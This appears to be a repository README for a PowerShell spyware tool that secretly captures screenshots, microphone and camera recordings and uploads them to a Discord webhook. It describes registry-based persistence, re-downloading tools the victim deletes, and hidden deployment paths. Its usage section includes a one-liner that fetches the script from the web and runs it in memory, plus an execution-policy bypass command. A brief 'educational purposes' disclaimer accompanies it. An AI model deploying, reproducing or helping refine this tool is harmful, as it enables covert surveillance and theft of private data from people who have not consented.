# Spider Spy

A PowerShell surveillance script that captures screenshots, microphone and camera data in intervals and exfiltrates them to a Discord webhook via HTTP requests.

## Features

- Periodic multi-monitor screenshot capture with overlays
- Deploys and runs microphone and camera recording tools
- Sends captured data to a configurable Discord webhook
- Automatically manages deployment paths and tool downloads
- Configurable timing and instant mode option

## Requirements

- Windows operating system with PowerShell (5.1+ recommended)
- Internet access to download tools and send data
- Permissions to create files in `%TEMP%` folder
- Discord webhook URL for data exfiltration

## Usage

Download or clone this repository and run the script with PowerShell:
```powershell
iex((iwr -uri https://github.com/Soumyo001/offensive_powershell/raw/refs/heads/main/spider_spy/spy.ps1).content)
```

### Parameters

- `-instant` (Switch)  
  If specified, triggers immediate microphone and camera capture instead of waiting for interval.

    Example:

    ```powershell
    powershell -ep bypass .\spy.ps1 -instant 1
    ```

## How It Works

1. Downloads configuration from a remote JSON file.
2. Determines safe directories to deploy tool binaries.
3. Recovers tool paths from registry if present or downloads new copies.
4. Periodically captures the active window and foreground process information.
5. Takes screenshots of all monitors and overlays user/computer info with timestamp and network IP.
6. Runs microphone and camera capturing tools at intervals.
7. Archives all captured data and uploads the zip to a Discord webhook.
8. Cleans up temporary files and repeats indefinitely with a sleep interval.


## Two Different Script

<table>
    <tr>
        <th> Script </th>
        <th> Description </th>
    </tr>
    <tr>
        <td> spy.ps1 </td>
        <td> 
            <ul>
                <li>Shuffles a set of directories</li>
                <li>Takes 2 random directories</li>
                <li>selected directories are stored in registry for persistance</li>
                <li>Downloads and places the PE tools (e.g. mic.exe, cam.exe)</li>
                <li>If any tool is deleted then:
                    <ol>
                        <li>re-shuffle from the set of directories</li>
                        <li>re-download the deleted PE file to the new path</li>
                    </ol>
                </li>
                <li>all the directories are fetched, meaning no set of diretories </br>
                    is visible in the script                
                </li>
                <li>config.json file is needed</li>
            </ul>
        </td>
    </tr>
    <tr> 
        <td> spy_simplified.ps1 </td>
        <td>
            <ul>
                <li>all the external/PE tools are stored in the TEMP directory</li>
                <li>if deleted any, then re-downloaded to the TEMP directory</li>
            </ul>
        </td>
    </tr>
</table>


## Notes and Warnings

- Designed for educational and authorized testing purposes only.
- Use responsibly and legally in your environment.
- Ensure the Discord Webhook URL is replaced with your own before running.
- Running this script may be detected by antivirus or endpoint protection software.
- Continuous resource usage due to constant screen capture and process launches.

## Contributing

Contributions and improvements are welcome. Please fork the repository and submit pull requests.